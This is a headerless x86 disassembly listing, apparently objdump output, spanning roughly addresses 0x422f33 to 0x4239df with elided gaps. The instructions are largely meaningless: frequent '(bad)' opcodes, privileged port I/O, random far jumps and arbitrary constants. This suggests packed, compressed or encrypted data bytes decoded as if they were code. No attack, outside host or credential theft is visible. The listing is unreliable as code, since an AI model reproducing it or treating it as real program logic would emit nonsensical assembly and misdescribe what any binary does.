  422f33:	neg    DWORD PTR [ebx+eiz*2+0x5e]
  422f37:	push   edx
  422f38:	adc    al,0x3d
  422f3a:	or     dl,0x5f
  422f3d:	cld    
  422f3e:	cdq    
  422f3f:	outs   dx,DWORD PTR ds:[esi]
  422f40:	xchg   ebx,eax
  422f41:	(bad)  
  422f42:	jns    0x422fbb
  422f44:	arpl   ax,ax
  422f46:	bound  ecx,QWORD PTR [ecx-0x34]
  422f49:	aas    
  422f4a:	ret    0xfb0
  422f4d:	pop    ecx
  422f4e:	sub    BYTE PTR [edx+0x5c6dc39f],0x77
  422f55:	cmp    bl,BYTE PTR [edx+0x39]
  422f58:	mov    dl,BYTE PTR [esi-0x1f2f7a8d]
  422f5e:	retf   0xd6f9
  422f61:	loopne 0x422ee3
  422f63:	loop   0x422f64
  422f65:	mov    ecx,0x121896eb
  422f6a:	xor    BYTE PTR [edi+0x6149fb27],dh
  422f70:	cs dec edi
  422f72:	cmp    DWORD PTR ds:0x18a42193,0xffffffdb
  422f79:	dec    esi
  422f7a:	sar    bh,cl
  422f7c:	rol    BYTE PTR [esi-0x7a80c9b1],cl
  422f82:	xchg   edi,eax
  422f83:	mov    dl,0x8a
  422f85:	(bad)  
  422f86:	stos   BYTE PTR es:[edi],al
  422f87:	mov    ebx,0x832e840c
  422f8c:	cli    
  422f8d:	mov    dl,0x92
  422f8f:	shr    edx,1
  422f91:	daa    
  422f92:	fwait
  422f93:	outs   dx,DWORD PTR ds:[esi]
  422f94:	into   
  422f95:	or     al,0x7e
  422f97:	pusha  
  422f98:	stos   BYTE PTR es:[edi],al
  422f99:	leave  
  422f9a:	and    al,dl
  422f9c:	push   ebp
  422f9d:	cmp    BYTE PTR [ebp+0x37],ch
  422fa0:	or     BYTE PTR [ecx+eax*4+0x7b],ch
  422fa4:	into   
  422fa5:	xor    eax,DWORD PTR [edx]
  422fa7:	cwde   
  422fa8:	jp     0x422fdb
  422faa:	pop    ecx
  422fab:	adc    eax,0xe277855b
  422fb0:	pop    ebx
  422fb1:	ds push es
  422fb3:	mov    ds:0xe9a88864,eax
  422fb8:	mov    esi,0x5a567c1
  422fbd:	ja     0x422f6e
  422fbf:	pushf  
  422fc0:	jmp    0x422f7d
  422fc2:	mov    ch,0xfe
  422fc4:	sbb    eax,0x4184b63d
  422fc9:	sub    BYTE PTR [ecx+0x55],0xac
  422fcd:	add    BYTE PTR [edx+0x48272d7],0xa7
  422fd4:	loopne 0x423023
  422fd6:	push   edx
  422fd7:	cmp    BYTE PTR [eax-0x3d],bl
  422fda:	xor    ebx,0xe4687cae
  422fe0:	js     0x422fb4
  422fe2:	in     eax,dx
  422fe3:	mov    DWORD PTR [eax],eax
  422fe5:	add    ebx,DWORD PTR [ebp+0x63]
  422fe8:	fld    TBYTE PTR [esi]
  422fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422feb:	jmp    0xb491110f
  422ff0:	ins    DWORD PTR es:[edi],dx
  422ff1:	imul   esp,DWORD PTR [edx+0xd2758e7],0xffffffd2
  422ff8:	aaa    
  422ff9:	mov    WORD PTR [ebx+0x42],cs
  422ffc:	sbb    ebp,DWORD PTR [esi-0x7eaa83db]
  423002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423003:	inc    esp
  423004:	in     eax,0x8
  423006:	aas    
  423007:	mov    DWORD PTR [edx],ebx
  423009:	dec    eax
  42300a:	mov    ecx,0xac2ec714
  42300f:	ret    
	...
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [eax+eax*2+0x603ea168],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	in     eax,dx
  42308d:	fs ins DWORD PTR es:[edi],dx
  42308f:	adc    DWORD PTR [ebx-0x36a331a3],ebx
  423095:	push   edx
  423096:	sub    bh,BYTE PTR [ecx-0x6eaffdd5]
  42309c:	cmp    ecx,DWORD PTR [edx-0x202a05a7]
  4230a2:	outs   dx,DWORD PTR ds:[esi]
  4230a3:	call   0xea49943b
  4230a8:	out    0x9b,eax
  4230aa:	sub    eax,0xa41dfa56
  4230af:	lods   eax,DWORD PTR ds:[esi]
  4230b0:	inc    ecx
  4230b1:	int3   
  4230b2:	psubusw mm7,QWORD PTR [edi+0x61]
  4230b6:	or     al,0xc2
  4230b8:	push   es
  4230b9:	inc    edi
  4230ba:	cmp    edi,DWORD PTR [ebx+0x6ef43f72]
  4230c0:	mov    ecx,0x90c321d
  4230c5:	dec    esi
  4230c6:	in     al,0x97
  4230c8:	add    BYTE PTR [ebx-0x3d797403],bh
  4230ce:	jmp    0x8cbd5087
  4230d3:	jb     0x4230ff
  4230d5:	nop
  4230d6:	push   esp
  4230d7:	rol    BYTE PTR [edi],1
  4230d9:	cmp    eax,0x8e2e51c9
  4230de:	outs   dx,BYTE PTR ds:[esi]
  4230df:	(bad)  
  4230e0:	jge    0x4230fc
  4230e2:	push   es
  4230e3:	sbb    ebp,ebp
  4230e5:	in     al,dx
  4230e6:	clc    
  4230e7:	push   es
  4230e8:	pop    edx
  4230e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230ea:	pop    ecx
  4230eb:	xor    BYTE PTR [ebx+0x6725f31],ah
  4230f1:	ja     0x42309c
  4230f3:	jg     0x4230f0
  4230f5:	shr    DWORD PTR [edi-0x78],cl
  4230f8:	fdiv   DWORD PTR [edx+0x516f4f23]
  4230fe:	mov    edi,0x86716384
  423103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423104:	int    0xe7
  423106:	mul    DWORD PTR [edx+0x572dd0ed]
  42310c:	sub    BYTE PTR ds:0x444f7fb2,0x22
  423113:	mov    ds:0x6adaa6cf,al
  423118:	aas    
  423119:	fild   WORD PTR [esi+0x3]
  42311c:	ja     0x423187
  42311e:	mov    ah,BYTE PTR [esi+ebx*2]
  423121:	(bad)  
  423122:	icebp  
  423123:	mov    ebp,esp
  423125:	mov    ebp,ecx
  423127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423128:	(bad)  
  423129:	sbb    ch,BYTE PTR [ecx]
  42312b:	ret    
  42312c:	mov    ds:0xcce39a77,eax
  423131:	jae    0x42310b
  423133:	and    cl,0xd7
  423136:	pop    ss
  423137:	adc    esi,DWORD PTR [ebx-0x41]
  42313a:	sbb    dl,0xfd
  42313d:	or     ah,BYTE PTR [ebx+0x6ff0d36b]
  423143:	lods   al,BYTE PTR ds:[esi]
  423144:	test   al,0x5c
  423146:	repnz imul eax,edx,0xd94afe9a
  42314d:	jmp    0x108b:0xb1a6c34a
  423154:	inc    ebp
  423155:	fs mov esi,0xd4c9285f
  42315b:	xor    eax,0xf9aaf3d2
  423160:	cs jbe 0x4231d7
  423163:	push   es
  423164:	stos   BYTE PTR es:[edi],al
  423165:	aaa    
  423166:	jmp    0x911c:0x28d1a22
  42316d:	fwait
  42316e:	sbb    BYTE PTR [ebx-0x68],bl
  423171:	pusha  
  423172:	mov    bh,0x1a
  423174:	ficomp DWORD PTR [edi+0x4fbc62bb]
  42317a:	xchg   esi,eax
  42317b:	xchg   ecx,eax
  42317c:	or     DWORD PTR [esi-0x3519922a],0xffffffde
  423183:	mov    esp,0xfaa1274c
  423188:	shr    BYTE PTR ds:0x191acc5b,cl
  42318e:	xor    dh,BYTE PTR [edx+0x0]
	...
  4231f4:	jns    0x4231e7
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x72461391],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	sbb    bl,0xda
  42320f:	aas    
  423210:	ss mov esi,0x3f887c0b
  423216:	hlt    
  423217:	push   ebp
  423218:	sub    eax,0x2df08cfb
  42321d:	mov    fs,WORD PTR [esi-0x5d]
  423220:	xor    DWORD PTR [edi+0x3139d48],edx
  423226:	inc    esi
  423227:	fcom   DWORD PTR [edx+eax*2-0x59656aa6]
  42322e:	lods   eax,DWORD PTR ds:[esi]
  42322f:	push   0x339b4604
  423234:	add    al,0xa0
  423236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423237:	inc    esp
  423238:	push   ds
  423239:	or     eax,0x8bb60f1a
  42323e:	fstp   QWORD PTR [ecx-0x79c12dc8]
  423244:	sbb    ebx,DWORD PTR [ebp+0x46]
  423247:	pop    cx
  423249:	pop    edx
  42324a:	ja     0x4231f9
  42324c:	jns    0x4231e3
  42324e:	push   ds
  42324f:	pop    es
  423250:	nop
  423251:	xor    al,0xc7
  423253:	popf   
  423254:	xchg   ebp,eax
  423255:	aad    0xfb
  423257:	and    cl,BYTE PTR ds:0x109c0831
  42325d:	leave  
  42325e:	dec    esi
  42325f:	imul   ebp,DWORD PTR [eax+0x7a],0x53
  423263:	(bad)  
  423264:	jl     0x4232da
  423266:	cmp    ah,BYTE PTR [eax+ecx*1-0x15c8e826]
  42326d:	jmp    0xb723a7ce
  423272:	not    BYTE PTR [esi]
  423274:	imul   eax,eax,0x31f08dc4
  42327a:	in     al,0xd0
  42327c:	sub    BYTE PTR [ebp+ebp*1+0x75a55fd2],bh
  423283:	(bad)  
  423284:	int3   
  423285:	into   
  423286:	test   al,0x33
  423288:	or     al,0x4b
  42328a:	jbe    0x42324e
  42328c:	in     eax,0x25
  42328e:	retf   
  42328f:	adc    DWORD PTR [ecx+0x35],ecx
  423292:	fiadd  WORD PTR [esi+0x0]
  423295:	push   ebp
  423296:	push   edx
  423297:	mov    edi,0x71750dbf
  42329c:	add    dh,BYTE PTR [esi-0x14]
  42329f:	imul   ebx,DWORD PTR [ebp-0x70fb8e2c],0x8286c78
  4232a9:	aas    
  4232aa:	retf   
  4232ab:	loop   0x42327d
  4232ad:	fsub   st,st(0)
  4232af:	xor    ch,BYTE PTR [eax+0x7d4d31a3]
  4232b5:	out    0x2e,eax
  4232b7:	adc    DWORD PTR [ebx],esi
  4232b9:	clc    
  4232ba:	cld    
  4232bb:	call   0x34e3b2b5
  4232c0:	mov    ebx,0x19295d74
  4232c5:	jbe    0x423312
  4232c7:	add    eax,0x52edb71a
  4232cc:	lock pop ebp
  4232ce:	mov    al,ds:0x8c616363
  4232d3:	mov    cl,0x93
  4232d5:	push   0x47
  4232d7:	sti    
  4232d8:	dec    esi
  4232d9:	pushf  
  4232da:	out    dx,al
  4232db:	into   
  4232dc:	fdivr  QWORD PTR [ecx-0x28fc198f]
  4232e2:	jge    0x4232a2
  4232e4:	mov    edi,0xa077baea
  4232e9:	retf   
  4232ea:	mov    dl,0xad
  4232ec:	jne    0x423294
  4232ee:	test   DWORD PTR gs:[ecx-0x596c44f6],edx
  4232f5:	aaa    
  4232f6:	(bad)  
  4232f7:	jmp    0xae986d27
  4232fc:	mov    ds:0x1958edeb,eax
  423301:	push   0x38ec9146
  423306:	cmp    al,BYTE PTR [ecx+0x4a7b6d6c]
  42330c:	jp     0x4232d6
  42330e:	jbe    0x4232dc
	...
  423374:	clc    
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xddad0f44
  423382:	lds    esp,FWORD PTR [ecx]
  423384:	push   0x4000177
  423389:	add    DWORD PTR [eax],eax
  42338b:	add    BYTE PTR [edx-0x6b021ceb],dh
  423391:	ret    
  423392:	mov    dh,0x2c
  423394:	xor    ah,dl
  423396:	add    DWORD PTR [ebp+0x47fc4873],edi
  42339c:	cmp    eax,0x181d5713
  4233a1:	inc    ecx
  4233a2:	imul   edi,DWORD PTR [ebx-0x2bd3d956],0xffffffee
  4233a9:	outs   dx,DWORD PTR ds:[esi]
  4233aa:	xor    BYTE PTR [edx-0x3e92b130],cl
  4233b0:	xchg   edx,eax
  4233b1:	push   0xffffffad
  4233b3:	in     eax,0x0
  4233b5:	add    bl,BYTE PTR [edi-0x1a855bff]
  4233bb:	stc    
  4233bc:	fnsave [esp+edi*1+0x1e]
  4233c0:	das    
  4233c1:	and    DWORD PTR [ebx+0x22ac585e],0x94f63139
  4233cb:	in     eax,dx
  4233cc:	repz add eax,0xba46f155
  4233d2:	push   esi
  4233d3:	leave  
  4233d4:	cmp    ch,bl
  4233d6:	and    ebx,ebx
  4233d8:	xchg   esi,edi
  4233da:	into   
  4233db:	nop
  4233dc:	(bad)  
  4233dd:	fiadd  DWORD PTR [edi]
  4233df:	stos   DWORD PTR es:[edi],eax
  4233e0:	xlat   BYTE PTR ds:[ebx]
  4233e1:	inc    ebx
  4233e2:	pop    ecx
  4233e3:	hlt    
  4233e4:	test   ebp,edi
  4233e6:	dec    edi
  4233e7:	dec    ebx
  4233e8:	sbb    ebp,DWORD PTR [esi]
  4233ea:	enter  0x9879,0x55
  4233ee:	mov    dl,0xfc
  4233f0:	push   eax
  4233f1:	adc    al,0x33
  4233f3:	jo     0x4233d5
  4233f5:	mov    ds:0x321025bf,al
  4233fa:	adc    eax,0xf3c306fb
  4233ff:	arpl   WORD PTR [ebx-0x1c],bp
  423402:	mov    DWORD PTR [ebx+0x5],esi
  423405:	push   ebp
  423406:	mov    eax,0x4ef4f0c7
  42340b:	std    
  42340c:	stos   DWORD PTR es:[edi],eax
  42340d:	gs and edx,edx
  423410:	add    BYTE PTR [edi-0x253f3e41],0x41
  423417:	and    ecx,DWORD PTR [ecx]
  423419:	and    dh,BYTE PTR [eax-0x5c]
  42341c:	mov    esi,0x1cf99e6e
  423421:	mov    dl,0x41
  423423:	repnz sbb ebp,DWORD PTR [esi+0x2997694c]
  42342a:	xchg   esp,eax
  42342b:	pop    ds
  42342c:	push   esi
  42342d:	ror    BYTE PTR [edx-0x3b],cl
  423430:	jp     0x4233c1
  423432:	popf   
  423433:	nop
  423434:	add    al,BYTE PTR [esi-0x6c]
  423437:	and    eax,0x89d7fad5
  42343c:	jmp    DWORD PTR [edx+0x3a4a3809]
  423442:	stos   DWORD PTR es:[edi],eax
  423443:	jbe    0x4233fe
  423445:	mov    ebp,0x8893aae9
  42344a:	pop    ds
  42344b:	les    esp,FWORD PTR [edi]
  42344d:	in     al,dx
  42344e:	jno    0x4233f1
  423450:	push   ecx
  423451:	pop    eax
  423452:	mov    WORD PTR [ebp-0x62],gs
  423455:	addr16 push ebx
  423457:	dec    eax
  423458:	int    0x9
  42345a:	pusha  
  42345b:	mov    ebx,0xee4154b7
  423460:	addr16 adc edi,edx
  423463:	outs   dx,DWORD PTR ds:[esi]
  423464:	push   ebx
  423465:	addr16 push 0xdaf13476
  42346b:	(bad)  
  42346c:	js     0x4234e3
  42346e:	inc    esp
  42346f:	les    ebp,FWORD PTR [edi*4-0x42c46296]
  423476:	xchg   ebp,eax
  423477:	test   ebp,ebx
  423479:	xor    cl,BYTE PTR [edi]
  42347b:	dec    ecx
  42347c:	mov    esi,0x507a1d39
  423481:	and    al,0x62
  423483:	popa   
  423484:	cmp    dh,bh
  423486:	cld    
  423487:	das    
  423488:	adc    al,0x6f
  42348a:	mov    ah,ch
  42348c:	popa   
  42348d:	mov    edi,0xb6dc
	...
  4234f2:	add    BYTE PTR [eax],al
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	shl    BYTE PTR [eax+0x2a],1
  423503:	popa   
  423504:	ins    BYTE PTR es:[edi],dx
  423505:	js     0x423508
  423507:	add    BYTE PTR [ecx+eax*1],al
  42350a:	add    BYTE PTR [eax],al
  42350c:	inc    edi
  42350d:	aas    
  42350e:	dec    ebx
  42350f:	int3   
  423510:	ins    BYTE PTR es:[edi],dx
  423511:	push   es
  423512:	loope  0x4234d5
  423514:	popf   
  423515:	in     al,dx
  423516:	pushf  
  423517:	xor    eax,DWORD PTR [ebp+0x7740bb03]
  42351d:	push   eax
  42351e:	mov    ds:0x657addeb,al
  423523:	jl     0x4234e6
  423525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423526:	lods   eax,DWORD PTR ds:[esi]
  423527:	hlt    
  423528:	jecxz  0x4234e5
  42352a:	mov    bl,0x7c
  42352c:	daa    
  42352d:	shl    DWORD PTR ds:0x8363648a,cl
  423533:	push   edx
  423534:	iret   
  423535:	fcmovu st,st(5)
  423537:	sahf   
  423538:	push   ecx
  423539:	pop    ebx
  42353a:	mov    al,0x7c
  42353c:	call   0x6b7f:0xc07555b9
  423543:	daa    
  423544:	inc    eax
  423545:	dec    edi
  423546:	in     al,0x6c
  423548:	jl     0x42354e
  42354a:	dec    esp
  42354b:	and    DWORD PTR [ebp+0x595004e6],ebp
  423551:	xchg   edx,eax
  423552:	mov    WORD PTR [ebx],cs
  423554:	add    BYTE PTR [edi],dl
  423556:	push   0x27518c8e
  42355b:	jecxz  0x42357f
  42355d:	hlt    
  42355e:	adc    DWORD PTR [ebx-0x55],0xffffff95
  423562:	xchg   bh,cl
  423564:	(bad)  
  423565:	mov    eax,0xe9057751
  42356a:	lds    eax,FWORD PTR [edi-0x29e2cb87]
  423570:	adc    ebx,DWORD PTR [ecx-0x14]
  423573:	xchg   ebx,eax
  423574:	sti    
  423575:	or     cl,ch
  423577:	sti    
  423578:	retf   
  423579:	test   eax,0xac9ddd0
  42357e:	xchg   ecx,eax
  42357f:	arpl   WORD PTR [esi+0x59732c08],bx
  423585:	in     eax,0x94
  423587:	mov    al,ds:0xfe1e4a90
  42358c:	dec    ecx
  42358d:	add    eax,0xe402e338
  423592:	adc    DWORD PTR [edi],ebx
  423594:	xchg   ecx,eax
  423595:	fs scas al,BYTE PTR es:[edi]
  423597:	xchg   ebp,eax
  423598:	mov    ebx,ecx
  42359a:	cmp    dh,dh
  42359c:	cli    
  42359d:	outs   dx,BYTE PTR ds:[esi]
  42359e:	sub    al,0x1a
  4235a0:	inc    esp
  4235a1:	jne    0x4235c5
  4235a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235a4:	sub    ebp,DWORD PTR [edx]
  4235a6:	or     BYTE PTR [edx+esi*8],0x47
  4235aa:	or     DWORD PTR [eax],eax
  4235ac:	stc    
  4235ad:	cmp    ebp,ebx
  4235af:	in     eax,0x39
  4235b1:	push   esp
  4235b2:	stos   BYTE PTR es:[edi],al
  4235b3:	push   edi
  4235b4:	sbb    al,BYTE PTR [eax]
  4235b6:	outs   dx,DWORD PTR ds:[esi]
  4235b7:	mov    DWORD PTR [edi],esp
  4235b9:	adc    dh,BYTE PTR [edi-0x49]
  4235bc:	jge    0x4235c2
  4235be:	fisttp QWORD PTR [ebx]
  4235c0:	loop   0x423621
  4235c2:	mov    esp,0xd1c06a81
  4235c7:	push   0x78ba761
  4235cc:	push   cs
  4235cd:	sbb    eax,DWORD PTR [eax]
  4235cf:	enter  0x9855,0x12
  4235d3:	addr16 jp 0x4235b8
  4235d6:	dec    ecx
  4235d7:	call   DWORD PTR [edx]
  4235d9:	push   eax
  4235da:	ret    
  4235db:	mov    esp,0x8d0dc96b
  4235e0:	loop   0x423562
  4235e2:	stc    
  4235e3:	aas    
  4235e4:	in     eax,0x34
  4235e6:	xchg   edx,eax
  4235e7:	inc    ecx
  4235e8:	push   0x88a0d487
  4235ed:	jbe    0x423594
  4235ef:	repnz retf 0xeaba
  4235f3:	jo     0x423667
  4235f5:	out    dx,eax
  4235f6:	out    dx,eax
  4235f7:	pop    ecx
  4235f8:	pop    eax
  4235f9:	jl     0x423642
  4235fb:	or     DWORD PTR [edx-0x6],0x7d669476
  423602:	(bad)  
  423603:	mov    cl,0x50
  423605:	jb     0x42365f
  423607:	stos   BYTE PTR es:[edi],al
  423608:	arpl   WORD PTR [esi],di
  42360a:	adc    ch,BYTE PTR fs:[eax]
  42360d:	push   ss
  42360e:	xor    eax,0xbf
	...
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0x8906be13
  423683:	iret   
  423684:	jo     0x4236ff
  423686:	add    DWORD PTR [eax],eax
  423688:	add    al,0x1
  42368a:	add    BYTE PTR [eax],al
  42368c:	mov    edx,0x421b80e1
  423691:	lods   al,BYTE PTR ds:[esi]
  423692:	xchg   esi,eax
  423693:	pop    ds
  423694:	jno    0x42361a
  423696:	scas   eax,DWORD PTR es:[edi]
  423697:	dec    edi
  423698:	jo     0x423659
  42369a:	repz ficom DWORD PTR [edx-0x3b82cd19]
  4236a1:	push   ebp
  4236a2:	repnz xchg edi,eax
  4236a4:	stos   DWORD PTR es:[edi],eax
  4236a5:	ja     0x42364c
  4236a7:	add    dl,BYTE PTR [esi+0xe]
  4236aa:	sbb    ebx,ebp
  4236ac:	adc    DWORD PTR [ebp+0x30],ebp
  4236af:	and    ebp,DWORD PTR [esi+0x1ef335]
  4236b5:	mov    ds:0xe502e5f0,al
  4236ba:	call   0xb18e:0x4d537f42
  4236c1:	mov    ebx,0x719e940d
  4236c6:	mov    ebx,0x9ed256d1
  4236cb:	test   eax,0x49612f1c
  4236d0:	out    dx,al
  4236d1:	imul   ecx,DWORD PTR [ebx],0xffffffbf
  4236d4:	jmp    0xd4fd71c2
  4236d9:	and    ah,ah
  4236db:	mov    WORD PTR [ebp+0x60fbad7f],es
  4236e1:	inc    ebx
  4236e2:	jl     0x423675
  4236e4:	lds    ecx,FWORD PTR [ebp-0x566b1161]
  4236ea:	jecxz  0x42368b
  4236ec:	xchg   ebp,eax
  4236ed:	lds    ebx,FWORD PTR [edx+0x19]
  4236f0:	inc    ebp
  4236f1:	and    al,0x52
  4236f3:	icebp  
  4236f4:	sub    eax,0x56122908
  4236f9:	mov    ecx,0x8e218bd5
  4236fe:	test   DWORD PTR [edi],ecx
  423700:	in     eax,dx
  423701:	cdq    
  423702:	ret    
  423703:	sbb    BYTE PTR [ecx-0x1a],cl
  423706:	adc    ch,ch
  423708:	inc    ebp
  423709:	xchg   edi,eax
  42370a:	jmp    0x6a0838fd
  42370f:	std    
  423710:	std    
  423711:	cmp    DWORD PTR [ebp-0x57b16525],0x7e7d6675
  42371b:	add    eax,0xaf1b1c79
  423720:	pop    edx
  423721:	adc    al,0xd1
  423723:	dec    ebp
  423724:	enter  0x6ea7,0x3d
  423728:	or     dh,BYTE PTR ds:0xaee0f38d
  42372e:	ss pop es
  423730:	pop    eax
  423731:	sbb    esp,DWORD PTR [ecx]
  423733:	data16 int3 
  423735:	pop    ss
  423736:	xor    BYTE PTR [eax+0x32],dh
  423739:	stos   DWORD PTR es:[edi],eax
  42373a:	clc    
  42373b:	repz cmp al,0xab
  42373e:	or     BYTE PTR ds:0xb6bae6ce,0x2a
  423745:	(bad)  
  423747:	test   BYTE PTR ds:0xba47165b,dl
  42374d:	jbe    0x423731
  42374f:	outs   dx,DWORD PTR ds:[esi]
  423750:	mov    esp,0x5ea86c88
  423755:	fwait
  423756:	add    al,dh
  423758:	jb     0x4236e6
  42375a:	dec    ebp
  42375b:	mov    dh,BYTE PTR [eax]
  42375d:	pop    ecx
  42375e:	sub    al,0xea
  423760:	retf   0xb9f0
  423763:	mov    ebp,0x689ce3f9
  423769:	popa   
  42376a:	xchg   DWORD PTR [edx+0x263cb0d0],ebp
  423770:	push   ebp
  423771:	inc    esi
  423772:	mov    ecx,0x57845acb
  423777:	test   DWORD PTR [edx+0x7b00c86a],eax
  42377d:	add    BYTE PTR [ebx],bh
  42377f:	div    BYTE PTR [ebp+edx*4+0x56]
  423783:	in     al,dx
  423784:	sahf   
  423785:	xor    eax,ebp
  423787:	cmp    eax,0xd3b479ef
  42378c:	in     eax,dx
  42378d:	in     al,dx
  42378e:	or     DWORD PTR [eax+eax*1+0x0],esp
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0x6689f17c
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	inc    edx
  42380d:	(bad)  
  42380e:	pusha  
  42380f:	dec    ebx
  423810:	lods   eax,DWORD PTR ds:[esi]
  423811:	out    dx,al
  423812:	add    esp,DWORD PTR [ebp-0xaea48e1]
  423818:	mov    bl,0xe8
  42381a:	ret    0xa2f0
  42381d:	cdq    
  42381e:	cmc    
  42381f:	add    DWORD PTR [esi],0xdc9146b0
  423825:	ret    
  423826:	out    dx,al
  423827:	xchg   esp,eax
  423828:	test   BYTE PTR [ebp-0x63],dl
  42382b:	int3   
  42382c:	dec    esi
  42382d:	and    al,0x3e
  42382f:	pop    ecx
  423830:	xchg   esi,eax
  423831:	sub    esp,DWORD PTR [ecx-0x42]
  423834:	in     eax,dx
  423835:	fwait
  423836:	adc    dl,BYTE PTR [ebx+eiz*8+0x30]
  42383a:	ja     0x4238b9
  42383c:	adc    ecx,DWORD PTR [ebx+0x67]
  42383f:	or     eax,0x35773908
  423844:	jp     0x4237ce
  423846:	jmp    0x31ba0d67
  42384b:	add    eax,0x8dba2226
  423850:	or     al,0xf1
  423852:	and    eax,0x61ecff0e
  423857:	or     cl,BYTE PTR [esi]
  423859:	sub    dh,BYTE PTR [ebp-0x37b22536]
  42385f:	fldenv [ebp+0x44]
  423862:	add    esi,edx
  423864:	in     al,dx
  423865:	loop   0x423877
  423867:	loope  0x42384a
  423869:	mov    ebx,0x1448ef9
  42386e:	test   al,0x93
  423870:	ja     0x4238ab
  423872:	mov    edx,0x7ad14901
  423877:	call   0x1c5e0a5b
  42387c:	(bad)  
  42387d:	int    0x1a
  42387f:	inc    edx
  423880:	(bad)  
  423881:	(bad)  
  423882:	push   ecx
  423883:	push   edx
  423884:	sub    eax,0xc7d113fc
  423889:	and    eax,DWORD PTR [ebp+0x28]
  42388c:	inc    edi
  42388d:	out    dx,eax
  42388e:	mov    ds,WORD PTR [ebx-0x3063810c]
  423894:	push   edi
  423895:	(bad)  
  423896:	sahf   
  423897:	inc    esi
  423898:	sahf   
  423899:	outs   dx,DWORD PTR ds:[esi]
  42389a:	out    dx,eax
  42389b:	call   0xbe40:0x45a86ae8
  4238a2:	outs   dx,BYTE PTR ds:[esi]
  4238a3:	out    0x14,eax
  4238a5:	neg    DWORD PTR [ebx+ecx*2+0x27]
  4238a9:	stos   BYTE PTR es:[edi],al
  4238aa:	push   ecx
  4238ab:	shl    BYTE PTR [eax],1
  4238ad:	mov    cl,0xe6
  4238af:	shr    cl,1
  4238b1:	mov    ah,0xb4
  4238b3:	sbb    ebx,esi
  4238b5:	dec    edx
  4238b6:	ficomp WORD PTR [edi-0x18]
  4238b9:	dec    ecx
  4238ba:	mov    ebp,0xaa41a672
  4238bf:	jl     0x423845
  4238c1:	pop    eax
  4238c2:	test   al,0x2f
  4238c4:	fild   DWORD PTR [esi-0x29]
  4238c7:	popf   
  4238c8:	retf   0xfdb0
  4238cb:	adc    esp,DWORD PTR [ebp-0x78f793c]
  4238d1:	inc    ecx
  4238d2:	mov    ds:0x1ee6e82f,eax
  4238d7:	cdq    
  4238d8:	scas   al,BYTE PTR es:[edi]
  4238d9:	jecxz  0x423927
  4238db:	add    edi,DWORD PTR [edi+0x616e1399]
  4238e1:	mov    ecx,0x570f34dd
  4238e6:	lahf   
  4238e7:	fwait
  4238e8:	retf   0x5588
  4238eb:	mov    eax,0x647baa0c
  4238f0:	cmp    eax,0x7e0bd0b4
  4238f5:	dec    eax
  4238f6:	dec    ecx
  4238f7:	mov    bl,0x43
  4238f9:	mov    ch,0x87
  4238fb:	push   ebp
  4238fc:	popa   
  4238fd:	adc    eax,0xca4af797
  423902:	jmp    0x5a55:0x16d6d492
  423909:	xlat   BYTE PTR ds:[ebx]
  42390a:	xchg   ebp,eax
  42390b:	shl    DWORD PTR [eax],0xfc
  42390e:	and    eax,0x2
	...
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x6a412bbd
  423982:	mov    edx,cs
  423984:	js     0x423a01
  423986:	add    DWORD PTR [eax],eax
  423988:	add    al,0x1
  42398a:	add    BYTE PTR [eax],al
  42398c:	or     BYTE PTR [ebp-0x2ed6f2da],bh
  423992:	jno    0x4239be
  423994:	or     bh,cl
  423996:	idiv   BYTE PTR [ebp+0x55]
  423999:	and    BYTE PTR [ecx+esi*1+0x5f],0x9d
  42399e:	retf   
  42399f:	jl     0x4239a0
  4239a1:	jo     0x4239c6
  4239a3:	gs jle 0x4239bc
  4239a6:	mov    ebx,0xfa51d1b7
  4239ab:	cwde   
  4239ac:	ret    
  4239ad:	push   edi
  4239ae:	test   DWORD PTR [ebx+0x2d],edi
  4239b1:	in     eax,dx
  4239b2:	loop   0x42398b
  4239b4:	leave  
  4239b5:	push   edi
  4239b6:	xor    ebx,esp
  4239b8:	pusha  
  4239b9:	or     eax,0xc6babb2d
  4239be:	stos   BYTE PTR es:[edi],al
  4239bf:	js     0x42397c
  4239c1:	int    0x54
  4239c3:	imul   BYTE PTR fs:[ecx]
  4239c6:	pop    ebx
  4239c7:	inc    eax
  4239c8:	and    esp,DWORD PTR [esi+0x1b]
  4239cb:	jge    0x4239e5
  4239cd:	pop    eax
  4239ce:	xchg   ecx,eax
  4239cf:	push   esp
  4239d0:	sbb    al,0x10
  4239d2:	enter  0x9540,0x69
  4239d6:	addr16 adc eax,0x593ff1f6
  4239dc:	int    0x2f
  4239de:	cdq    
  4239df:	mov    BYTE PTR [esp+ebx*2-0x9e31d],ch
